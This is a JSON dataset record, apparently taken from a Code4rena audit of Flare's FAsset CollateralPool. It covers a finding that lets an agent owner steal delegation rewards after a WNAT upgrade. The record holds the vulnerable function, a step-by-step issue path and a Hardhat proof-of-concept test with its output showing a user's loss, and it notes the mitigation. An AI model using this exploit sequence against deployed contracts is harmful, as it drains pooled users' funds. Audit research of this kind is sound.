@@ -1,0 +1,94 @@
+{
+  "id": "c4-2025-08-flare-fasset-M-03",
+  "extraction_type": "github_complete",
+  "source_url": "https://github.com/code-423n4/2025-08-flare/blob/7bcf1437ddd739a15f8aa1b588fcc17eb66d2f31/contracts/collateralPool/implementation/CollateralPool.sol#L832",
+  "is_complete": true,
+  "tier": "tier_1",
+  "referenced_lines": [
+    [
+      832,
+      832
+    ]
+  ],
+  "filename": "c4-2025-08-flare-fasset-M-03_CollateralPool.sol",
+  "has_pragma": true,
+  "has_contract": true,
+  "has_function": true,
+  "balanced_braces": true,
+  "num_lines": 908,
+  "vulnerability_title": "[M-03] Accumulated rewards in FSTO can be stolen by the agent\u2019s owner",
+  "recommendation": {
+    "has_recommendation": false,
+    "recommendation_text": "",
+    "fix_code_blocks": []
+  },
+  "poc": {
+    "has_poc": true,
+    "poc_text": "**Issue Path:**\n\n- Users contribute their WNATs to the agent\u2019s pool.\n- The owner\u2019s agent delegates voting power to signal providers.\n- The WNAT address is modified by the asset updater in the Flare Time Series Oracle (FTSO).\n- `AssetManagerController::updateContracts` is invoked by every user, as it does not have access constraints.\n  The agent\u2019s owner identifies the opportunity and executes `CollateralPool::claimDelegationRewards`, resulting in the transfer of new WNAT to the agent\u2019s pool; however, the `totalCollateral` remains unchanged due to an inconsistency between the received token and the pool\u2019s collateral token.\n- Subsequently, the agent\u2019s owner invokes `CollateralPool::upgradeWNatContract`, which merely swaps the old WNATs for the new version.\n- Finally, the agent\u2019s owner can sweep collected new WNATs as a reward following the announcement of destruction.\n\n```\n    function claimDelegationRewards(\n        IRewardManager _rewardManager,\n        uint24 _lastRewardEpoch,\n        IRewardManager.RewardClaimWithProof[] calldata _proofs\n    )\n        external\n        onlyAgent\n        nonReentrant\n        returns (uint256)\n    {\n     @>>>   uint256 balanceBefore = wNat.balanceOf(address(this));\n        _rewardManager.claim(address(this), payable(address(this)), _lastRewardEpoch, true, _proofs);\n      @>>>  uint256 balanceAfter = wNat.balanceOf(address(this));\n        uint256 claimed = balanceAfter - balanceBefore;\n        totalCollateral += claimed;\n        assetManager.updateCollateral(agentVault, wNat);\n        emit CPClaimedReward(claimed, 1);\n        return claimed;\n    }\n```\n\n**Coded PoC:**\n\nKindly apply the git patch and incorporate the subsequent proof of concept (PoC) into `AttackScenario.ts`.\n\n```\n++ b/test/integration/assetManager/AttackScenarios.ts\n++import { impersonateContract, stopImpersonatingContract } from \"../../../lib/test-utils/contract-test-helpers\";\n++ const WNat = artifacts.require(\"WNatMock\");\n\n+++ b/contracts/assetManager/mock/RewardManagerMock.sol\n@@ -24,7 +24,7 @@ contract RewardManagerMock {\n     )\n         external returns(uint256 _rewardAmount)\n     {\n-        uint256 reward = 1 ether;\n+        uint256 reward = 1000 ether;\n         if (_wrap) {\n             wNat.transfer(_recipient, reward);\n         } else {\n```\n\n```\n    it.only(\"update-wnat-address\", async() => {\n\n        const agent = await Agent.createTest(context, agentOwner1, underlyingAgent1);\n\n        const requiredCollateral = await agent.requiredCollateralForLots(10);\n        await agent.depositCollateralsAndMakeAvailable(requiredCollateral.vault, requiredCollateral.pool);\n\n        const user = accounts[12];\n        await agent.collateralPool.enter({value: requiredCollateral.pool, from: user});\n\nconst newWNAT = await WNat.new(context.governance, \"WNAT2\", \"WNAT2\");\n\nawait impersonateContract(context.assetManagerController.address, toBNExp(1, 18), accounts[0]);\n        await context.assetManager.updateSystemContracts(context.assetManagerController.address, newWNAT.address,\n                    { from: context.assetManagerController.address });\n        await stopImpersonatingContract(context.assetManagerController.address);\n\n        let snapshotId = await network.provider.send(\"evm_snapshot\", []);\n        await context.assetManager.upgradeWNatContract(agent.agentVault.address, {from: agent.ownerWorkAddress});\n\n        let rewardManagerMock = artifacts.require('RewardManagerMock');\n        let rewardManager = await rewardManagerMock.new(newWNAT.address);\n        let claimAmount = toBNExp(1000, 18);\n        await newWNAT.depositTo(rewardManager.address, { value: claimAmount });\n        await agent.collateralPool.claimDelegationRewards(rewardManager.address, 0, [],\n            { from: agent.ownerWorkAddress});\n\n        let totalCollateral = await agent.collateralPool.totalCollateral();\n        let totalSupply = await agent.collateralPoolToken.totalSupply();\n        let tokenShare = await agent.collateralPoolToken.balanceOf(user);\n        let natShare1 = totalCollateral.mul(tokenShare).div(totalSupply);\n        console.log(\"net share with updating wnat address before claiming is %d NAT:\", Number(natShare1) / 1e18);\n        await network.provider.send(\"evm_revert\", [snapshotId]);\n\n        rewardManagerMock = artifacts.require('RewardManagerMock');\n        rewardManager = await rewardManagerMock.new(newWNAT.address);\n        claimAmount = toBNExp(1000, 18);\n        await newWNAT.depositTo(rewardManager.address, { value: claimAmount });\n        await agent.collateralPool.claimDelegationRewards(rewardManager.address, 0, [],\n            { from: agent.ownerWorkAddress});\n\n        await context.assetManager.upgradeWNatContract(agent.agentVault.address, {from: agent.ownerWorkAddress});\n\ntotalCollateral = await agent.collateralPool.totalCollateral();\n        totalSupply = await agent.collateralPoolToken.totalSupply();\n        tokenShare = await agent.collateralPoolToken.balanceOf(user);\n        let natShare2 = totalCollateral.mul(tokenShare).div(totalSupply);\n        console.log(\"net share without updating wnat address before claiming is %d NAT\", Number(natShare2) / 1e18);\n        console.log(\"user's loss:%d NAT\", (natShare1 - natShare2) / 1e18)\n\n});\n```\n\n```\n  Contract: AssetManager.sol; test/integration/assetManager/AttackScenarios.ts; Asset manager integration tests\nnet share with updating wnat address before claiming is 251500 NAT:\nnet share without updating wnat address before claiming is 250999.99999999997 NAT:\nuser's loss:500.00000000001154 NAT\n    \u2714 update-wnat-address (91ms)\n\n1 passing (3s)\n```\n\n**[Flare mitigated](https://github.com/code-423n4/2025-10-flare-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n\n> `upgradeWNatContract` must be called by governance or a governance-appointed executor.\n\n**Status:** Mitigation confirmed. Full details in reports from [farman1094](https://code4rena.com/audits/2025-10-flare-fasset-mitigation-review/submissions/S-8) and [rvierdiiev](https://code4rena.com/audits/2025-10-flare-fasset-mitigation-review/submissions/S-9).",
+    "poc_code_blocks": [
+      "function claimDelegationRewards(\n        IRewardManager _rewardManager,\n        uint24 _lastRewardEpoch,\n        IRewardManager.RewardClaimWithProof[] calldata _proofs\n    )\n        external\n        onlyAgent\n        nonReentrant\n        returns (uint256)\n    {\n     @>>>   uint256 balanceBefore = wNat.balanceOf(address(this));\n        _rewardManager.claim(address(this), payable(address(this)), _lastRewardEpoch, true, _proofs);\n      @>>>  uint256 balanceAfter = wNat.balanceOf(address(this));\n        uint256 claimed = balanceAfter - balanceBefore;\n        totalCollateral += claimed;\n        assetManager.updateCollateral(agentVault, wNat);\n        emit CPClaimedReward(claimed, 1);\n        return claimed;\n    }",
+      "++ b/test/integration/assetManager/AttackScenarios.ts\n++import { impersonateContract, stopImpersonatingContract } from \"../../../lib/test-utils/contract-test-helpers\";\n++ const WNat = artifacts.require(\"WNatMock\");\n\n+++ b/contracts/assetManager/mock/RewardManagerMock.sol\n@@ -24,7 +24,7 @@ contract RewardManagerMock {\n     )\n         external returns(uint256 _rewardAmount)\n     {\n-        uint256 reward = 1 ether;\n+        uint256 reward = 1000 ether;\n         if (_wrap) {\n             wNat.transfer(_recipient, reward);\n         } else {",
+      "it.only(\"update-wnat-address\", async() => {\n\n        const agent = await Agent.createTest(context, agentOwner1, underlyingAgent1);\n\n        const requiredCollateral = await agent.requiredCollateralForLots(10);\n        await agent.depositCollateralsAndMakeAvailable(requiredCollateral.vault, requiredCollateral.pool);\n\n        const user = accounts[12];\n        await agent.collateralPool.enter({value: requiredCollateral.pool, from: user});\n\nconst newWNAT = await WNat.new(context.governance, \"WNAT2\", \"WNAT2\");\n\nawait impersonateContract(context.assetManagerController.address, toBNExp(1, 18), accounts[0]);\n        await context.assetManager.updateSystemContracts(context.assetManagerController.address, newWNAT.address,\n                    { from: context.assetManagerController.address });\n        await stopImpersonatingContract(context.assetManagerController.address);\n\n        let snapshotId = await network.provider.send(\"evm_snapshot\", []);\n        await context.assetManager.upgradeWNatContract(agent.agentVault.address, {from: agent.ownerWorkAddress});\n\n        let rewardManagerMock = artifacts.require('RewardManagerMock');\n        let rewardManager = await rewardManagerMock.new(newWNAT.address);\n        let claimAmount = toBNExp(1000, 18);\n        await newWNAT.depositTo(rewardManager.address, { value: claimAmount });\n        await agent.collateralPool.claimDelegationRewards(rewardManager.address, 0, [],\n            { from: agent.ownerWorkAddress});\n\n        let totalCollateral = await agent.collateralPool.totalCollateral();\n        let totalSupply = await agent.collateralPoolToken.totalSupply();\n        let tokenShare = await agent.collateralPoolToken.balanceOf(user);\n        let natShare1 = totalCollateral.mul(tokenShare).div(totalSupply);\n        console.log(\"net share with updating wnat address before claiming is %d NAT:\", Number(natShare1) / 1e18);\n        await network.provider.send(\"evm_revert\", [snapshotId]);\n\n        rewardManagerMock = artifacts.require('RewardManagerMock');\n        rewardManager = await rewardManagerMock.new(newWNAT.address);\n        claimAmount = toBNExp(1000, 18);\n        await newWNAT.depositTo(rewardManager.address, { value: claimAmount });\n        await agent.collateralPool.claimDelegationRewards(rewardManager.address, 0, [],\n            { from: agent.ownerWorkAddress});\n\n        await context.assetManager.upgradeWNatContract(agent.agentVault.address, {from: agent.ownerWorkAddress});\n\ntotalCollateral = await agent.collateralPool.totalCollateral();\n        totalSupply = await agent.collateralPoolToken.totalSupply();\n        tokenShare = await agent.collateralPoolToken.balanceOf(user);\n        let natShare2 = totalCollateral.mul(tokenShare).div(totalSupply);\n        console.log(\"net share without updating wnat address before claiming is %d NAT\", Number(natShare2) / 1e18);\n        console.log(\"user's loss:%d NAT\", (natShare1 - natShare2) / 1e18)\n\n});",
+      "Contract: AssetManager.sol; test/integration/assetManager/AttackScenarios.ts; Asset manager integration tests\nnet share with updating wnat address before claiming is 251500 NAT:\nnet share without updating wnat address before claiming is 250999.99999999997 NAT:\nuser's loss:500.00000000001154 NAT\n    \u2714 update-wnat-address (91ms)\n\n1 passing (3s)"
+    ]
+  },
+  "problem_code": {
+    "has_problem_code": true,
+    "source": "github_line_refs_function_scope",
+    "snippets": [
+      {
+        "function_name": "claimDelegationRewards",
+        "start_line": 820,
+        "end_line": 839,
+        "code": "\n    function claimDelegationRewards(\n        IRewardManager _rewardManager,\n        uint24 _lastRewardEpoch,\n        IRewardManager.RewardClaimWithProof[] calldata _proofs\n    )\n        external\n        onlyAgent\n        nonReentrant\n        returns (uint256)\n    {\n        uint256 balanceBefore = wNat.balanceOf(address(this));\n        _rewardManager.claim(address(this), payable(address(this)), _lastRewardEpoch, true, _proofs);\n        uint256 balanceAfter = wNat.balanceOf(address(this));\n        uint256 claimed = balanceAfter - balanceBefore;\n        totalCollateral += claimed;\n        assetManager.updateCollateral(agentVault, wNat);\n        emit CPClaimedReward(claimed, 1);\n        return claimed;\n    }",
+        "confidence": 97,
+        "reason": "Function enclosing GitHub-referenced vulnerable line",
+        "matched_references": [
+          [
+            832,
+            832
+          ]
+        ]
+      }
+    ]
+  },
+  "extraction_date": "2026-10-27T04:42:04.915169",
+  "validation": {
+    "validated_at": "2026-10-27T05:07:23",
+    "model": "claude-opus-5-5 (review, no API)",
+    "code_input_source": "github_line_refs_function_scope",
+    "content_code_consistency": {
+      "consistent": true,
+      "confidence": 70,
+      "summary_matches": true,
+      "content_matches": true,
+      "content_reasoning": "The linked line is the reward claim in claimDelegationRewards. It counts claimed rewards only as the change in the pool's own wNat balance, so rewards wrapped into a different token are never added to totalCollateral, and destroy later sends untracked wNat to the agent's recipient. The finding text is cut off, so the exact theft path is inferred from the code.",
+      "functions_found": [
+        "claimDelegationRewards",
+        "destroy",
+        "upgradeWNatContract"
+      ],
+      "variables_found": [
+        "wNat",
+        "totalCollateral"
+      ],
+      "patterns_found": [
+        "reward amount measured as the balance change of the pool's own wNat",
+        "untracked wNat sent to the recipient in destroy"
+      ],
+      "issues": [
+        "The finding text stops after one paragraph, so the theft path through destroy is inferred rather than stated."
+      ]
+    },
+    "mando_classification": {
+      "primary_category": null,
+      "mando_applicable": false
+    },
+    "scsvs_classification": {
+      "primary_category": "G4",
+      "primary_category_name": "Business logic",
+      "vulnerability_type": "rewards paid in a different wrapped token are not counted for pool holders"
+    },
+    "fix_code_source": "none"
+  }
+}
